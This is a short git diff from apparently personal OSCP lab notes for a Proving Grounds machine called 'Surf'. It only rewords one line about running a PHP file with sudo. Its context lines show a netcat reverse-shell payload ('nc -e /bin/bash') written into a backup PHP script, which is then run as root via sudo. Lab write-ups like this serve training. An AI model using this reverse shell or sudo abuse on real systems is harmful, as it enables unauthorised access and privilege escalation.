@@ -138,7 +138,7 @@ echo "<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>" >  /var/backups/d
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Surf/Surf_2021.11.21_17h31m28s_017_.png)
 
-Executing the php file with sudo.
+Executing the php file with sudo in ```james``` session shell.
 
 ```
 sudo /usr/bin/php /var/backups/database-backup.php
